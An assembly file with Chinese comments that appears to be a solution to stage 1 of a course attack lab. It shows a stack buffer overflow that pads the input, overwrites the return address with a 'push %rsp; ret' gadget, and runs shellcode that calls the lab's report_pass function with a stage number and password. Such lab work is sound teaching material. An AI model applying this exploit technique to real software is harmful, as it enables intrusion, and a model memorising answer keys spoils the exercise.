# attack1.s — 阶段 1：无金丝雀、栈可执行（本机版）
#
# 阶段 1 没有金丝雀，本地与服务器两份程序字节一致，所以 local/ 与 remote/
# 下这两份汇编产出的字节完全相同（源文件只有开头注释不同）。
#
# 输入布局（共 485 字节）：
#   偏移 0..455    456 字节填充 0x67（'g'），写满 prompt[] 直到返回地址之前
#   偏移 456..463  覆盖 chat_turn 的返回地址 → 0x48b20b
#   偏移 464..484  shellcode
#
# 0x48b20b 处是 push %rsp; ret：
#   ret 进入这里时 %rsp = %rbp+0x10，正好是 shellcode 的开头；
#   push %rsp 把这个地址压栈，ret 再弹回 %rip，控制流落到栈上的代码
#   （这个程序链接时开了可执行栈）。
#
# shellcode 把 report_pass 的参数放进 %rdi、%rsi，再 ret 进入 report_pass：
#   %rdi = 1（阶段号）
#   %rsi = 0xdc22eaf2a8fe9994（口令：学号 SHA-256 前 8 字节按大端读）

.text
.fill 456, 1, 0x67          # 0..455：填充
.quad 0x48b20b              # 456：返回地址 = push %rsp; ret

# 464：shellcode
push $0x1938000             # report_pass 的地址（压栈供最后的 ret 用）
movl $1, %edi               # 阶段号 1
movabs $0xdc22eaf2a8fe9994, %rsi    # 口令
ret                         # 进入 report_pass
